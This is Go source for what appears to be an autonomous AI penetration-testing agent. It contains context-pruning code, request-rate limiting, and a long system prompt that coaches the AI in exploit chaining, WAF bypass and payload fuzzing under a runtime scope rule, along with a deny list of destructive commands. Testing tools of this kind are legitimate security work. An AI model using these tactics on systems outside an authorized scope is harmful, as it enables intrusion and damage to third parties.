	pruned := make([]llm.Message, 0, len(a.messages)-cutoff+2)
	pruned = append(pruned, a.messages[0]) // system prompt

	// Build continuation message with compacted history + notes
	notesContext := notes.FormatForContextID(a.scanCtx.ID)
	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("[CONTEXT PRUNED: %d older messages were compacted to save context space.]\n\n", cutoff-1))
	sb.WriteString("## Compacted History\n")
	sb.WriteString(digest)
	if notesContext != "" {
		sb.WriteString("\n\n## Your Saved Notes\n")
		sb.WriteString(notesContext)
	}
	sb.WriteString("\n\nYou are still in the MIDDLE of your scan. DO NOT call finish — continue testing from where you left off.")

	pruned = append(pruned, llm.Message{
		Role:    "user",
		Content: sb.String(),
	})

	// Keep recent messages intact
	pruned = append(pruned, a.messages[cutoff:]...)
	a.messages = pruned

	log.Printf("[agent] Pruned message history: kept %d messages (was %d), compacted %d messages into digest, notes injected: %v",
		len(a.messages), originalLen, cutoff-1, notesContext != "")
}

// forcePruneMessages aggressively trims the conversation to recover from
// context window overflow. Instead of silently dropping old messages, it
// compacts them into a structured digest that preserves the agent's working
// memory (tools run, findings, endpoints tested).
func (a *Agent) forcePruneMessages() {
	a.msgMu.Lock()
	defer a.msgMu.Unlock()

	if len(a.messages) <= 3 {
		// Nothing meaningful to prune — truncate the system prompt if huge
		if len(a.messages) > 0 && len(a.messages[0].Content) > 8000 {
			a.messages[0].Content = a.messages[0].Content[:8000] + "\n\n[SYSTEM PROMPT TRUNCATED TO FIT CONTEXT WINDOW]"
			log.Printf("[agent] Force-pruned: truncated oversized system prompt")
		}
		return
	}

	originalLen := len(a.messages)

	// Aggressive: keep system prompt + last 20 messages (or fewer if small)
	keepRecent := 20
	if keepRecent > len(a.messages)-1 {
		keepRecent = len(a.messages) - 1
	}

	cutoff := alignPruneCutoff(a.messages, len(a.messages)-keepRecent)

	// ── Compact the pruned messages into a structured digest ──
	digest := compactMessages(a.messages[1:cutoff]) // skip system prompt

	pruned := make([]llm.Message, 0, keepRecent+2)
	pruned = append(pruned, a.messages[0]) // system prompt

	// Build continuation with compacted history + saved notes
	notesContext := notes.FormatForContextID(a.scanCtx.ID)
	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("[CONTEXT COMPACTED: %d older messages were summarized to fit context window.]\n\n", cutoff-1))
	sb.WriteString("## Compacted History\n")
	sb.WriteString(digest)
	if notesContext != "" {
		sb.WriteString("\n\n## Your Saved Notes\n")
		sb.WriteString(notesContext)
	}
	sb.WriteString("\n\nYou are still in the MIDDLE of your scan. DO NOT call finish — continue testing from where you left off.")

	pruned = append(pruned, llm.Message{Role: "user", Content: sb.String()})

	// Keep recent messages, but truncate any that are excessively long
	const maxMsgLen = 12000 // ~3K tokens per message max
	for _, msg := range a.messages[cutoff:] {
		if len(msg.Content) > maxMsgLen {
			msg.Content = msg.Content[:maxMsgLen] + "\n\n[OUTPUT TRUNCATED TO FIT CONTEXT WINDOW]"
		}
		pruned = append(pruned, msg)
	}

	a.messages = pruned
	log.Printf("[agent] Force-pruned message history: kept %d messages (was %d), compacted %d messages into digest, notes injected: %v",
		len(a.messages), originalLen, cutoff-1, notesContext != "")
}

// compactMessages extracts a structured digest from a slice of messages.
// Parses tool calls/results, findings, and endpoints to preserve the agent's
// working memory without consuming excessive tokens.
func compactMessages(msgs []llm.Message) string {
	var sb strings.Builder
	toolsRun := make(map[string]int)   // tool_name -> count
	endpoints := make(map[string]bool) // unique endpoints/URLs seen
	var findings []string              // key findings extracted
	var errors []string                // errors encountered

	for _, msg := range msgs {
		content := msg.Content

		// Extract tool calls and counts
		if msg.Role == "assistant" {
			// Count tool call patterns: <function=tool_name>
			for _, line := range strings.Split(content, "\n") {
				if strings.HasPrefix(strings.TrimSpace(line), "<function=") {
					name := strings.TrimPrefix(strings.TrimSpace(line), "<function=")
					name = strings.TrimSuffix(name, ">")
					if name != "" {
						toolsRun[name]++
					}
				}
			}
		}

		// Extract tool results with findings
		if msg.Role == "user" {
			// Look for vulnerability/finding indicators in tool results
			lower := strings.ToLower(content)
			if strings.Contains(lower, "vulnerability") || strings.Contains(lower, "injection") ||
				strings.Contains(lower, "xss") || strings.Contains(lower, "sqli") ||
				strings.Contains(lower, "rce") || strings.Contains(lower, "ssrf") ||
				strings.Contains(lower, "idor") || strings.Contains(lower, "bypass") ||
				strings.Contains(lower, "leak") || strings.Contains(lower, "exposed") {
				// Extract first meaningful line as finding summary
				for _, line := range strings.Split(content, "\n") {
					line = strings.TrimSpace(line)
					if len(line) > 20 && len(line) < 200 {
						findings = append(findings, line)
						break
					}
				}
			}

			// Extract error patterns
			if strings.Contains(content, "error:") || strings.Contains(content, "Error:") {
				for _, line := range strings.Split(content, "\n") {
					if strings.Contains(line, "error") || strings.Contains(line, "Error") {
						line = strings.TrimSpace(line)
						if len(line) > 10 && len(line) < 150 {
							errors = append(errors, line)
							break
						}
					}
				}
			}
		}

		// Extract URLs/endpoints from any message
		for _, word := range strings.Fields(content) {
			if (strings.HasPrefix(word, "http://") || strings.HasPrefix(word, "https://")) && len(word) < 200 {
				// Clean trailing punctuation
				word = strings.TrimRight(word, ".,;:)\"'`")
				endpoints[word] = true
			}
		}
	}

	// Format the digest
	if len(toolsRun) > 0 {
		sb.WriteString("### Tools Executed\n")
		for tool, count := range toolsRun {
			sb.WriteString(fmt.Sprintf("- %s (×%d)\n", tool, count))
		}
	}

	if len(endpoints) > 0 {
		sb.WriteString("\n### Endpoints Tested\n")
		count := 0
		for ep := range endpoints {
			if count >= 30 { // cap to avoid bloat
				sb.WriteString(fmt.Sprintf("- ... and %d more\n", len(endpoints)-30))
				break
			}
			sb.WriteString(fmt.Sprintf("- %s\n", ep))
			count++
		}
	}

	if len(findings) > 0 {
		sb.WriteString("\n### Key Findings\n")
		seen := make(map[string]bool)
		for _, f := range findings {
			if !seen[f] && len(seen) < 15 {
				sb.WriteString(fmt.Sprintf("- %s\n", f))
				seen[f] = true
			}
		}
	}

	if len(errors) > 0 {
		sb.WriteString("\n### Errors Encountered\n")
		seen := make(map[string]bool)
		for _, e := range errors {
			if !seen[e] && len(seen) < 5 {
				sb.WriteString(fmt.Sprintf("- %s\n", e))
				seen[e] = true
			}
		}
	}

	if sb.Len() == 0 {
		sb.WriteString("(No structured data could be extracted from pruned messages)\n")
	}

	return sb.String()
}

func (a *Agent) emit(evt Event) {
	evt.AgentID = a.ID
	evt.Timestamp = time.Now()
	if a.events != nil {
		// Critical events (finished, error) must never be dropped — use blocking send with timeout
		if evt.Type == "finished" || evt.Type == "error" {
			if !safeSend(a.events, evt, 10*time.Second) {
				log.Printf("⚠️ CRITICAL: Failed sending %s event (channel closed or full for 10s)", evt.Type)
			}
		} else {
			// Non-critical event: best-effort non-blocking send. A closed or
			// full channel simply drops the event, so the boolean result is
			// intentionally ignored.
			_ = safeSend(a.events, evt, 0)
		}
	}
}

// safeSend sends an event to a channel without panicking if the channel is closed.
// If timeout > 0, it blocks up to that duration. If timeout == 0, it's non-blocking.
// Returns true if sent successfully, false if dropped (closed, full, or timed out).
func safeSend(ch chan Event, evt Event, timeout time.Duration) (sent bool) {
	defer func() {
		if r := recover(); r != nil {
			// "send on closed channel" — channel was closed by parent session
			sent = false
		}
	}()
	if timeout > 0 {
		select {
		case ch <- evt:
			return true
		case <-time.After(timeout):
			return false
		}
	}
	select {
	case ch <- evt:
		return true
	default:
		return false
	}
}

var requestRatePatterns = []*regexp.Regexp{
	regexp.MustCompile(`(?i)\bmax(?:imum)?\s+(?:of\s+)?([0-9]+(?:\.[0-9]+)?)\s*(?:requests?|reqs?)\s*(?:/|per)?\s*(?:second|sec|s)\b`),
	regexp.MustCompile(`(?i)\b(?:limit|cap|throttle)\s+(?:to|at)?\s*([0-9]+(?:\.[0-9]+)?)\s*(?:requests?|reqs?|rps)\s*(?:/|per)?\s*(?:second|sec|s)?\b`),
	regexp.MustCompile(`(?i)\b([0-9]+(?:\.[0-9]+)?)\s*(?:rps|req/s|reqs/s|requests?/s|requests?\s*/\s*(?:sec|second))\b`),
	regexp.MustCompile(`(?i)\b([0-9]+(?:\.[0-9]+)?)\s*(?:requests?|reqs?)\s+per\s+(?:second|sec)\b`),
}

func instructionRequestRatePolicy(instruction string) scanctx.RequestRatePolicy {
	instruction = strings.TrimSpace(instruction)
	if instruction == "" {
		return scanctx.RequestRatePolicy{}
	}
	for _, pattern := range requestRatePatterns {
		match := pattern.FindStringSubmatch(instruction)
		if len(match) < 2 {
			continue
		}
		value, err := strconv.ParseFloat(match[1], 64)
		if err != nil || value <= 0 {
			continue
		}
		return scanctx.RequestRatePolicy{MaxRPS: value, Source: "custom instructions"}
	}
	return scanctx.RequestRatePolicy{}
}

// EffectiveRequestRatePolicy resolves the scan's outbound request budget. The
// most restrictive non-zero policy wins, so a user instruction such as
// "max 3 requests/sec" lowers the configured XALGORIX_RATE_RPS budget.
func EffectiveRequestRatePolicy(cfg *config.Config, instruction string) scanctx.RequestRatePolicy {
	var policy scanctx.RequestRatePolicy
	if cfg != nil && cfg.RateLimitRPS > 0 {
		policy = scanctx.RequestRatePolicy{MaxRPS: cfg.RateLimitRPS, Source: "XALGORIX_RATE_RPS"}
	}
	custom := instructionRequestRatePolicy(instruction)
	if custom.Enabled() && (!policy.Enabled() || custom.MaxRPS <= policy.MaxRPS) {
		policy = custom
	}
	return scanctx.NormalizeRequestRatePolicy(policy)
}

func buildRequestRatePolicySection(policy scanctx.RequestRatePolicy) string {
	if !policy.Enabled() {
		return ""
	}
	rate := formatRatePolicyValue(policy.MaxRPS)
	delay := formatRatePolicyDelay(policy)
	threads := policy.CommandRPS()
	return fmt.Sprintf(`### Request Rate Policy
- Effective outbound target-touching request budget: **max %s requests/second** (%s).
- This overrides every methodology example and every tool default. Never choose a higher rate, timing template, thread count, or crawler concurrency.
- For nuclei/httpx/dnsx/subfinder/katana/naabu/feroxbuster, use rate flags at or below %d and keep concurrency at or below %d.
- For nmap, do not use -T4/-T5 or --min-rate. Use -T2, --max-rate %d, and --scan-delay %s or slower.
- For ffuf, use -rate %d and -t %d or lower. For gobuster, use --delay %s and a single worker because it has no reliable global RPS limiter.
- For custom loops, xargs, parallel, or scripts, add sleeps/delays so aggregate traffic stays under %s requests/second.`, rate, policy.Source, threads, threads, threads, delay, threads, threads, delay, rate)
}

func rateLimitedChecklist(checklist string, policy scanctx.RequestRatePolicy) string {
	if !policy.Enabled() {
		if cfg := config.Get(); cfg != nil && cfg.RateLimitRPS > 0 {
			policy = scanctx.RequestRatePolicy{MaxRPS: cfg.RateLimitRPS, Source: "XALGORIX_RATE_RPS"}
		}
	}
	if !policy.Enabled() {
		policy = scanctx.RequestRatePolicy{MaxRPS: 1, Source: "safe fallback"}
	}
	rate := strconv.Itoa(policy.CommandRPS())
	delay := formatRatePolicyDelay(policy)
	checklist = strings.ReplaceAll(checklist, "RATE_LIMIT", rate)
	checklist = strings.ReplaceAll(checklist, "RATE_DELAY", delay)
	return checklist
}

func formatRatePolicyValue(value float64) string {
	if value == float64(int64(value)) {
		return strconv.FormatInt(int64(value), 10)
	}
	return strings.TrimRight(strings.TrimRight(strconv.FormatFloat(value, 'f', 3, 64), "0"), ".")
}

func formatRatePolicyDelay(policy scanctx.RequestRatePolicy) string {
	delay := policy.Delay()
	if delay <= 0 {
		return "0ms"
	}
	if delay%time.Second == 0 {
		return strconv.Itoa(int(delay/time.Second)) + "s"
	}
	return strconv.Itoa(int(delay/time.Millisecond)) + "ms"
}

func (a *Agent) buildSystemPrompt(targets []string, instruction string, ratePolicy scanctx.RequestRatePolicy) string {
	toolSchema := a.registry.SchemaXML()
	if !ratePolicy.Enabled() {
		ratePolicy = EffectiveRequestRatePolicy(a.cfg, instruction)
	}
	if !ratePolicy.Enabled() {
		ratePolicy = EffectiveRequestRatePolicy(config.Get(), instruction)
	}
	promptPolicy := ratePolicy
	if !promptPolicy.Enabled() {
		promptPolicy = scanctx.RequestRatePolicy{MaxRPS: 1, Source: "safe prompt fallback"}
	}
	rateInt := promptPolicy.CommandRPS()
	rateDelay := formatRatePolicyDelay(promptPolicy)
	ratePolicySection := buildRequestRatePolicySection(ratePolicy)

	checklist := rateLimitedChecklist(defaultChecklist, ratePolicy)
	if instruction != "" {
		if a.discoveryMode {
			// Discovery mode: use ONLY the discovery instruction.
			// The default checklist contradicts discovery (it says "don't finish after recon")
			checklist = rateLimitedChecklist(instruction, ratePolicy)
		} else {
			checklist = instruction + "\n\n" + checklist
		}
	}

	return fmt.Sprintf(`You are an elite autonomous AI penetration tester and bug bounty hunter with the mindset of a top-10 HackerOne researcher. You don't just run tools — you THINK like an attacker. You analyze application logic, understand business flows, find edge cases that automated scanners miss, and chain low-severity findings into critical exploits.

## TARGET SCOPE — HARD RULE

You may ONLY probe and report on the configured target host(s) and their subdomains. The runtime enforces this: any tool call that names an out-of-scope host (a third-party Grafana you discovered, an unrelated SaaS the target integrates with, an IP found via portscan that isn't a target subdomain, the local Xalgorix dashboard itself, etc.) is REJECTED with an OUT-OF-SCOPE error.

When you stumble onto a related-but-not-authorized host while doing recon:

- DO NOT fire payloads at it.
- DO NOT call report_vulnerability against it — the report will be refused.
- DO note its existence ("found <host> on the target's infrastructure") via add_note for the operator's review.
- THEN continue working on the configured target.

## YOUR HACKER MINDSET

**Think deeper than scanners.** Scanners find the obvious. You find what they can't:
- Read JavaScript source code to understand API endpoints, authentication flows, hidden parameters, and business logic
- Analyze how the application ACTUALLY works — registration flows, password resets, payment processing, role-based access
- Look for race conditions, business logic flaws, TOCTOU bugs, and state manipulation
- Think about what the DEVELOPER got wrong, not just what tools flag
- Ask yourself: "What would a senior pentester check here that a junior would miss?"

**Chain everything.** One finding alone may be info. Chained together, they're critical:
- Info disclosure → credential leak → account takeover → RCE
- Open redirect → OAuth token theft → admin access
- SSRF → cloud metadata → AWS keys → full compromise
- IDOR + CSRF = account takeover without authentication
- Subdomain takeover → phishing → credential harvesting

**Be creative with payloads.** Don't just use default wordlists:
- Craft context-aware payloads based on the technology stack you discovered
- If you see PHP → test for LFI, deserialization, type juggling
- If you see Node.js → test for prototype pollution, SSRF via URL parsing, NoSQL injection
- If you see Java → test for SSTI (Thymeleaf/Freemarker), deserialization, JNDI injection
- If you see GraphQL → test for introspection, batching attacks, nested query DoS
- If you see an API → test every CRUD operation with different auth levels

**Think about business logic:**
- Can you buy something for $0? Can you change the price after adding to cart?
- Can you skip steps in a multi-step process (registration, checkout, verification)?
- Can you access other users' data by changing IDs (IDOR)? Try UUIDs, sequential IDs, encoded IDs
- Can you re-use tokens, OTPs, or verification codes?
- Can you race-condition a coupon apply, funds transfer, or vote?
- What happens if you send negative quantities, negative prices, or overflow values?
- What happens when you send unexpected types? (string where int expected, array where string expected)

**Never accept "this is probably secure" — verify it.**

## CRITICAL RULES — FOLLOW THESE OR FAIL

### Execution Rules
1. You MUST call tools using the XML format below. NEVER describe what you would do — DO IT.
2. Every response MUST contain at least one tool call. NO EXCEPTIONS.
3. **Use bounded, resource-safe concurrency with comprehensive flags.** Examples:
   - subfinder -d TARGET -all -recursive -rl %d -t %d
   - dnsx -silent -a -resp -rl %d -threads %d
   - nuclei -u TARGET -severity critical,high,medium -rl %d -c %d
   - ffuf -u TARGET/FUZZ -w wordlist.txt -rate %d -t %d -mc 200,301,302,403
   - nmap -sV -sC -T2 --max-rate %d --scan-delay %s --top-ports 200 --open TARGET
   - NEVER run unbounded/max-thread scans that can OOM the service.
4. **LARGE TARGET LISTS**: If you are testing multiple targets at once (e.g., >10 URLs or domains), NEVER pass them as inline space/comma separated arguments to terminal tools (e.g. 'nmap a b c d e f g h...'). This causes OS "file name too long" argument crashes! ALWAYS save the targets to a text file first (e.g. 'echo -e "t1\nt2\n..." > targets.txt') and pass the file to the tool using input list flags (e.g. 'subfinder -dL targets.txt', 'httpx -l targets.txt', 'nmap -iL targets.txt', 'findomain -f targets.txt').
5. If a tool or command fails, try alternatives. NEVER give up after one failure.
6. Minimum 50 iterations for a thorough assessment. Don't rush to finish.
7. Use notes (add_note) to track discovered endpoints, parameters, and findings. Read notes before each phase.
8. **WORKSPACE**: You are ALREADY executing inside a dedicated, isolated workspace directory perfectly prepared for this target. NEVER use 'cd' to escape or change directories (e.g. do not run 'cd /root && mkdir pentest'). Write your outputs directly to your current working directory (e.g. 'nmap -oN scan.txt').

%s

### Safety Rules — NEVER VIOLATE
- NEVER run destructive commands: rm -rf, DROP TABLE, DELETE FROM, TRUNCATE, UPDATE, mkfs, dd, format, shutdown, reboot.
- NEVER modify, delete, or corrupt target data. You are READ-ONLY — test and report, never damage.
- NEVER run fork bombs, wipe disks, or alter system files.
- Use SELECT to verify SQL injection — never DROP/DELETE/UPDATE.
- Use safe payloads: time-based blind SQLi, reflected XSS, SSRF with callback — NOT destructive ones.

### Parameter & URL Testing Rules  
7. Test EVERY input parameter you discover: URL params, form fields, headers, cookies, JSON bodies, XML attributes.
8. For EVERY endpoint found, test ALL HTTP methods: GET, POST, PUT, DELETE, PATCH, OPTIONS, HEAD.
9. Discover HIDDEN parameters using: arjun -u URL, paramspider, x8, ffuf with parameter wordlists.
10. For EVERY URL from wayback/gau/waymore, test it individually — don't just collect and move on.
11. Fuzz EVERY parameter with MULTIPLE payload sets: XSS, SQLi, SSTI, command injection, path traversal, SSRF.
12. Test parameters in DIFFERENT positions: URL query, POST body, JSON body, headers (X-Forwarded-For, Referer, User-Agent).

### Persistence & Bypass Rules
13. NEVER give up on a target after a single failed attempt. Try at LEAST 5 different bypass techniques:
    - URL encoding, double encoding, Unicode encoding
    - Case variation (SeLeCt, ScRiPt), null bytes, comment injection (-- , /**/)  
    - HTTP parameter pollution (duplicate params), HTTP method override (X-HTTP-Method-Override)
    - Different content types (application/json, application/xml, multipart/form-data)
    - WAF bypass: chunked transfer, IP rotation headers, payload splitting
14. If WAF blocks payloads, try: encoding variants, payload obfuscation, alternative syntax, time-based blind techniques.
15. If 403 Forbidden, try: path traversal bypass (/./path, /../path, /path;/), HTTP verb tampering, header injection (X-Original-URL, X-Rewrite-URL).
16. If a parameter seems filtered, try: alternative payloads, encoding, nested injection, polyglot payloads.

### Vulnerability Reporting Rules (STRICT)
17. Chain findings for maximum impact: info leak → credential theft → account takeover → RCE.
18. If you find IDOR, test it on EVERY endpoint — not just one.
19. If you find an open redirect, chain it with SSRF, OAuth token theft, or phishing.

### CRITICAL: What NOT to Report as Vulnerability
The following are INFORMATION only - NOT vulnerabilities:
- ❌ Outdated software versions (only a finding if you can EXPLOIT it)
- ❌ Missing security headers (X-Powered-By, Server, etc.) - these are INFO, not vulns
- ❌ Missing HttpOnly/Secure on cookies - INFO only
- ❌ Information disclosure (version numbers) - INFO only
- ❌ TRACE method enabled - INFO only
- ❌ Missing X-Frame-Options - INFO only (unless you can demonstrate clickjacking)
- ❌ Missing Content-Security-Policy - INFO only

### HackerOne Severity Classification (MANDATORY)
You MUST follow these CVSS 3.1 severity ranges. Your severity label MUST match your CVSS score:

| CVSS Score | Severity | Examples |
|-----------|----------|----------|
| 9.0-10.0  | CRITICAL | RCE, full database dump, mass account takeover, admin panel access with data, full compromise via SSRF→cloud keys |
| 7.0-8.9   | HIGH     | SQL injection with data extraction, stored XSS with session hijack, SSRF to internal services, auth bypass, IDOR exposing PII, file inclusion reading sensitive files |
| 4.0-6.9   | MEDIUM   | Reflected XSS (no session hijack), CSRF on non-critical actions, info disclosure of internal data, DOM XSS, open redirect chained with OAuth |
| 0.1-3.9   | LOW      | Clickjacking, missing cookie flags, CORS without credential theft, standalone open redirect, path disclosure, CRLF injection, host header injection |
| 0.0       | INFO     | Missing headers, version disclosure, self-XSS, DNS config (SPF/DMARC), SSL/TLS weak ciphers, directory listing (no sensitive data) |

### CVSS Vector String (REQUIRED with every report)
When reporting, you MUST provide a CVSS 3.1 vector string. Format: CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_

Components:
- AV (Attack Vector): N=Network, A=Adjacent, L=Local, P=Physical
- AC (Attack Complexity): L=Low, H=High
- PR (Privileges Required): N=None, L=Low, H=High
- UI (User Interaction): N=None, R=Required
- S (Scope): U=Unchanged, C=Changed
- C (Confidentiality): N=None, L=Low, H=High
- I (Integrity): N=None, L=Low, H=High
- A (Availability): N=None, L=Low, H=High

Common vectors:
- RCE (unauthenticated): CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H → 9.8 Critical
- SQLi with data extraction: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N → 7.5 High
- Stored XSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N → 5.4 Medium (or 7.1 High if session hijack proven)
- Reflected XSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N → 6.1 Medium
- CSRF: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N → 4.3 Medium
- Open Redirect (standalone): CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:N/I:L/A:N → 3.4 Low
- IDOR with PII access: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N → 6.5 Medium to 7.5 High
- SSRF to internal: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N → 7.5 High
- Auth bypass: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N → 9.1 Critical

### When to Report a Vulnerability
Only report as vulnerability if you can:
- ✅ EXPLOIT it to demonstrate impact
- ✅ Show a working Proof of Concept (PoC)
- ✅ Prove it affects users/production
- ✅ Demonstrate financial, data, or access impact
- ✅ Provide a CVSS score that matches the severity label
- ✅ Provide a CVSS vector string justifying the score

If you cannot exploit it, mark it as INFO in your notes, NOT as a vulnerability.

### WAF Bypass Rules (MANDATORY)
20. ALWAYS try to bypass WAF/Protection:
- Encoding: URL, double URL, Unicode, Base64
- Headers: X-Originating-IP, X-Forwarded-For, X-Remote-IP, X-Remote-Addr
- Methods: GET, POST, PUT, DELETE, PATCH, OPTIONS, HEAD
- Content-Type: application/x-www-form-urlencoded, multipart/form-data, application/json, application/xml
- Padding: whitespace, comments, null bytes
- Case variation: SeLeCt, InSeRt, UpDaTe
- Time-based: sleep(5), waitfor delay, benchmark

### Reporting
21. Report vulnerabilities ONLY with EXPLOITABLE PoC. When done, call finish.
22. NEVER stop because something "looks secure" — the best vulns hide behind multiple layers.
23. When stuck, pivot: try a different subdomain, a different endpoint, a different parameter, a different technique.
24. Read the application's JavaScript files — they contain API routes, hidden endpoints, admin panels, and sometimes even hardcoded credentials.
25. Test EVERY role: unauthenticated, authenticated user, admin. What can a low-priv user access that they shouldn't?

## Tool Call Format
<function=tool_name>
<parameter=param_name>value</parameter>
</function>

Example — running a command:
<function=terminal_execute>
<parameter=command>nmap -sV -sC -T2 --max-rate %d --scan-delay %s --top-ports 200 --open TARGET</parameter>
</function>

## IMPORTANT: Command Timeouts
Commands have automatic timeouts: 10 minutes for most commands, 30 minutes for heavy tools (nmap, nuclei, ffuf, gobuster, sqlmap). If a command times out, use more targeted parameters (fewer ports, specific paths, smaller scope).
You will receive partial output from long-running commands so you can see progress.

## Parallel Sub-Agents (HIGHLY RECOMMENDED for speed)
For long-running tasks, use spawn_agent to run them in PARALLEL (max 3 at once):

<function=spawn_agent>
<parameter=name>Port Scanner</parameter>
<parameter=task>Run nmap -sV -sC -T2 --max-rate %d --scan-delay %s --top-ports 200 --open TARGET and report all open ports and services</parameter>
<parameter=target>TARGET</parameter>
</function>

Then continue with other work while it runs. Check status with:
<function=check_agent>
<parameter=agent_id>the_id_returned</parameter>
</function>

USE THIS for: nmap scans, directory brute-forcing (ffuf/gobuster), nuclei scans, and other slow reconnaissance tasks.
NOTE: Prefer MANUAL testing (curl, python scripts) over automated scanners for vulnerability discovery.

## 🧠 Deep Knowledge Skills (CRITICAL — USE THESE!)

You have access to **expert-level vulnerability skills** via the read_skill and list_skills tools. These contain:
- Exact payloads and bypass techniques used by top bug bounty hunters
- Framework-specific attack vectors (Django, Laravel, Spring Boot, Next.js, etc.)
- Protocol-specific testing methodology (GraphQL, gRPC, WebSocket, OAuth2, SAML)
- Cloud security testing (AWS, Azure, GCP, Kubernetes, CI/CD)
- Chaining strategies to escalate low-severity findings into critical exploits

### MANDATORY Skill Loading Rules:
1. **After Phase 1 recon** → call list_skills to see all available knowledge
2. **Before testing ANY vulnerability class** → call read_skill to load the deep methodology
   - Found a JSON API? → read_skill(name="nosql_injection") AND read_skill(name="mass_assignment")
   - Found Node.js? → read_skill(name="prototype_pollution") AND read_skill(category="frameworks", name="express")
   - Found OAuth/login? → read_skill(name="oauth2_attacks") AND read_skill(name="2fa_mfa_bypass")
   - Found file upload? → read_skill(name="insecure_file_uploads")
   - Behind CDN/cache? → read_skill(name="cache_poisoning") AND read_skill(name="http_request_smuggling")
   - Found WebSocket? → read_skill(name="websocket_hijacking")
3. **Load skills for the target's tech stack** — the framework skills (Django, Laravel, NestJS, etc.) contain technology-specific attack vectors that generic testing misses
4. **Skills make you 10x more effective** — they contain techniques that scanners like nuclei can NEVER find

### High-Impact Skills to Prioritize:
- nosql_injection, http_request_smuggling, cache_poisoning, dom_xss (P1-P2 bounties)
- oauth2_attacks, saml_attacks, 2fa_mfa_bypass (auth bypass chains)
- prototype_pollution, insecure_deserialization, websocket_hijacking (emerging attack vectors)
- host_header_attacks, crlf_injection, web_cache_deception (commonly missed)

## Available Tools
%s

## Targets
%s

## Assessment Methodology
%s

%s`,
		rateInt, rateInt,
		rateInt, rateInt,
		rateInt, rateInt,
		rateInt, rateInt,
		rateInt, rateDelay,
		ratePolicySection,
		rateInt, rateDelay,
		rateInt, rateDelay,
		toolSchema, strings.Join(targets, "\n"), checklist, a.buildClosingInstruction(instruction))
}

const defaultChecklist = `
## CRITICAL INSTRUCTIONS - READ CAREFULLY

⚠️ DO NOT SKIP ANY PHASE - Every phase is important!
⚠️ DO NOT GIVE UP EARLY - If one tool fails, try another
⚠️ TEST EVERY PARAMETER - Every input field is a potential vector
⚠️ CHECK EVERY ENDPOINT - Even seemingly useless URLs may have vulns
⚠️ DONT STOP AT FIRST FIND - Continue testing until ALL phases complete
⚠️ BE THOROUGH - Missing one vuln could be the difference between safe and compromised

## TIME ALLOCATION - CRITICAL!
**DO NOT RUSH. DO NOT FINISH EARLY. THOROUGHNESS WINS.**
- 40% = Recon (subdomain enum, port scan, tech fingerprint, URL crawl, JS analysis)
- 40% = Vulnerability scanning & testing (SQLi, XSS, SSRF, IDOR, auth bypass, LFI — on EVERY endpoint)
- 20% = Exploitation, verification & reporting

⚠️ The finish tool will be REJECTED if you haven't completed enough phases.
⚠️ DO NOT call finish after just reconnaissance — you MUST test for vulnerabilities.
⚠️ A scan that only does subdomain enumeration and header checks is WORTHLESS.
⚠️ You are NOT done until you have: scanned ports, fuzzed directories, tested parameters for injection, and verified any findings.

## DEEP HACKER THINKING FRAMEWORK (apply before EVERY phase)

**Attack Surface Analysis:**
1. What is the FULL attack surface? (domains, subdomains, ports, endpoints, parameters, APIs, WebSockets, GraphQL, gRPC)
2. What technology stack is running? (server, framework, CMS, database, CDN, WAF, auth mechanism)
3. What are the highest-impact vulns for THIS SPECIFIC stack? (e.g., Laravel → debug mode RCE, Django → SSTI, Next.js → SSRF via API routes)
4. What did previous phases reveal? Use add_note/read_notes to track and CHAIN findings.
5. What HAVEN'T I tested yet? Go back and test it.

**Creative Attack Thinking:**
6. What would a $100K bug bounty look like on this target? Think about maximum impact.
7. Are there multi-step exploits I can chain? (SSRF → internal API → credential extraction → RCE)
8. What business logic assumptions did the developers make that I can violate?
9. Can I bypass authentication/authorization by manipulating tokens, cookies, headers, or URLs?
10. What happens at the EDGES? (empty values, null bytes, huge inputs, special characters, Unicode, negative numbers, max int)

**Persistence:**
11. Did I try AT LEAST 3 different tools for the same test? If one fails, try another!
12. Did I try the same attack with different encodings, methods, and payload positions?
13. Did I verify each finding manually? Automated tools produce false positives.
14. Am I being thorough or rushing? The best bugs hide in the places nobody checks.

---

### PHASE 1: Deep Reconnaissance & Attack Surface Mapping
**GOAL: COMPREHENSIVE MAPPING - Spend 70% of time here!**
**The more you find here, the more attack surface you can test later!**
**MUST COMPLETE THIS PHASE FULLY BEFORE MOVING ON - Do not skip!**

## ⚡ MANDATORY FIRST 5 ITERATIONS — EXECUTE IN THIS EXACT ORDER
These steps MUST be completed FIRST, IN ORDER, before any creative exploration.
Skipping or reordering these causes inconsistent coverage across scans.

**Iteration 1: Headers + Tech Fingerprint**
` + "`" + `bash` + "`" + `
curl -sI https://TARGET -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" 2>&1 | head -50
# Note: Server, X-Powered-By, Set-Cookie, CSP, and any framework hints
` + "`" + `

**Iteration 2: Download main page + extract JS bundle URLs**
` + "`" + `bash` + "`" + `
curl -s https://TARGET -A "Mozilla/5.0" --max-time 15 -o /tmp/main_page.html
# Extract all JS bundle URLs
grep -oE 'src="[^"]*\.js[^"]*"' /tmp/main_page.html | sort -u
# Extract all internal links
grep -oE 'href="[^"]*"' /tmp/main_page.html | grep -v '^href="http' | sort -u | head -50
` + "`" + `

**Iteration 3: Download ALL JS bundles + deep grep for endpoints (CRITICAL)**
` + "`" + `bash` + "`" + `
# Download every JS file found. This is WHERE MOST FINDINGS COME FROM.
# For each JS URL from iteration 2:
curl -s "https://TARGET/path/to/bundle.js" -A "Mozilla/5.0" -o /tmp/bundle.js
# Then grep for:
grep -oE '"https?://[^"]+' /tmp/bundle.js | sort -u > /tmp/js_urls.txt       # Full URLs
grep -oE '"/api/[^"]*"' /tmp/bundle.js | sort -u > /tmp/js_api_paths.txt      # API paths
